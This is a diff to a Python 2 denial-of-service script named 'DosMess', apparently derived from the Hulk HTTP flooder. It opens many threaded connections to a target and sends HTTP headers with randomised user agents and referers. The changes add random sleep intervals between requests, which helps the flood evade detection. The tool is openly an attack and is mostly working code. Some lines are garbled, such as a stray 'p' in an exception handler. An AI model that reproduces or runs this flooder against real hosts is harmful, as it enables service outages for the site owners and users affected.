@@ -1,8 +1,9 @@
+
 import os, sys, time
 import socket, thread
 import random
 from threading import Lock
- 
+
 
 COLOR_BLACK     = 0
 COLOR_RED       = 1
@@ -23,7 +24,6 @@ def useragent_list():
 	with open('cleanuseragents', 'r') as f:
 		lines = f.readlines()
 	for line in lines:
-		print line;
 		headers_useragents.append(line);
 	return(headers_useragents)
 
@@ -31,7 +31,7 @@ def useragent_list():
 
 
 def referer_list():
-	global headers_referers
+	headers_referers=[]
 	headers_referers.append('http://www.google.com/?q=')
 	headers_referers.append('http://www.usatoday.com/search/results?q=')
 	headers_referers.append('http://engadget.search.aol.com/search?q=')
@@ -54,9 +54,11 @@ def referer_list():
 	headers_referers.append('http://api.duckduckgo.com/html/?q=')
 	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
 
+	return (headers_referers);
+
 	
 def keyword_list():
-        global keyword_top
+        keyword_top=[]
         keyword_top.append('S0u1izG0d')
         keyword_top.append('EatthisPussy')
         keyword_top.append('You Can Add Random Shit here lmao')
@@ -84,9 +86,10 @@ def keyword_list():
         keyword_top.append('TAKE EM DOWN PEW PEW PEW')
         keyword_top.append('Anonymous')
         keyword_top.append('LLLLLLLLUUUUUUUUUUUUUUULLLLLLLLLLLLZZZZZZZZZZZZZSSSSSSSSSSEEEEEEEEEEEEECCCCCCC')
+	keyword_top.append('vampi cyber girl is here to stay')
 
-	headers_referers.append('http://' + host + '/')
-	return(headers_referers)
+	#headers_referers.append('http://' + host + '/')
+	return(keyword_top)
 
 def inc_counter():
 	global request_counter
@@ -138,6 +141,8 @@ def helptext ():
         print "   -t\t\tSet number of threads"
         print "   -c\t\tSet number of connections per thread"
         print "   -i\t\tSet number of iterations per connection"
+	print "   -sMi\t\tSet minimal seconds to sleep between http requests(optional)"
+	print "   -sMa\t\tSet maxumum seconds to sleep between http requests(optional)"
         print "   -p\t\tSet host port number"
         print ""
         print " NEW ON UPDATES!!! - Gonna work on UDP on this tool :D  "
@@ -146,7 +151,7 @@ def helptext ():
         exit()
  #From Hulk
 def main (args):
-        global host, port, num_threads, connection_amount, itr, headers_useragents
+        global host, port, num_threads, connection_amount, itr,  sleepMin, sleepMax
 
         pname = args[0]
         i = 1
@@ -169,75 +174,92 @@ def main (args):
 		elif a == "-i":
 			i +=1
 			itr = int(args[i])
-			print "iterations: '%s'" % args[i]
+		elif a == "-sMi":
+			i +=1
+			sleepMin = int(args[i])
+		elif a == "-sMa":
+			i +=1
+			sleepMax = int(args[i])
                 elif host == None:
                         host = args[i]
                 else:
                         print "Invalid argument '%s'" % args[i]
                         exit()
-               
+
                 i += 1
         if host == None:
                 print "Enter a target"
                 exit()
 
+	if sleepMin == None:
+		sleepMin=3
+	if sleepMax == None:
+		sleepMax=10
  
         start()
  
  
  
 # I added random thread making here 
-def sender (num):
-        global dead,headers_useragents
+def sender (num, headers_useragents, headers_referer, keyword_top):
+        global dead
 
-	headers_useragents=useragent_list() 
-       
         def col ():
                 color = (num % 6) + 1
                 out("\x1b[%d;30m%02d\x1b[49;39m" % (color + 40, num))
-       
+
         col()
         print " * | DosMess %d started" % num
-       
+
         cons = []
-       
-        
+	
+
         while True:                          # rapidly connects to server
+
                 bleh = False
-		rnd_num=int(random.random() * len(headers_useragents))
+		rnd_num=int(random.random() * len(headers_useragents));
+		rnd_num_1=int(random.random() * len(headers_referer));
+		rnd_num_2=int(random.random() * len(keyword_top));
+
+
                 for i in range (connection_amount):
                         s = socket.socket()
                         cons += [s]
-                        try:
+                        try:				
                                 s.connect((host, port))
+				print(repr(s.recv(1024)))
+				
                         except:
+				p
                                 col()
                                 print " # | - ERROR IN THREAD %d: COULD NOT CONNECT" % num
                                 bleh = True
+		print "ooooooooo"
                 if bleh:
                         continue
-                               
+
+
+	
+
                 col()
                 print " O | Thread %d opened %d connections" % (num, connection_amount)
-
-		print "headers_useragents: %d " % len(headers_useragents)
-		print "rnd num: %d " % rnd_num
-		print "headers_useragents_rnd: %s " % headers_useragents[rnd_num]
 
 
                #Also from hulk
                 header = "GET %s HTTP/1.1\r\n" % path
                 fulldata  = "Host: localhost\r\n"
-                fulldata += "User-Agent: %s " % headers_useragents[rnd_num]  
+                fulldata += "User-Agent: %s " % headers_useragents[rnd_num]
+		fulldata += "Referer: %s%s" % (headers_referer[rnd_num_1], keyword_top)
                 fulldata += "Accept-Language: en-US,en;q=0.8\r\n"
                 fulldata += "\r\n"
+
 
                 # send a beginning header
                 try:
                         for c in cons:
                                 c.send(header + fulldata)
 				data = c.recv(4096) 
-				print "received message:", data
+			
                 except:
                         bleh = True
 
@@ -260,7 +282,7 @@ def sender (num):
                         print " > | Thread %d sent some data (%d/%d)" % (num, i, cap)
 
                         # wait three seconds between each header.. o.O Lowest you can go is 1 :) ENJOY dont crash you computer -_-
-                        time.sleep(3)
+                        time.sleep(random.randint(sleepMin, sleepMax));
 
                 # if something went wrong
                 if bleh:
@@ -284,6 +306,7 @@ def sender (num):
  
  
 def start ():
+	global headers_useragents, headers_referer, keyword_top
         # show a banner :P
         print "/------------------------------------------------------\\"
         h_on  = "\x1b[37;1m"
@@ -297,8 +320,15 @@ def start ():
         time.sleep(1)
        
         # start threads
+
+	headers_useragents=useragent_list() ;
+	headers_referer=referer_list();
+	keyword_top=keyword_list();
+
+
+
         for i in range(num_threads):
-                thread.start_new_thread(sender,(i,))
+                thread.start_new_thread(sender,(i,headers_useragents,headers_referer, keyword_top ))
                 time.sleep(0.1)
        
         # keyboard interrupt
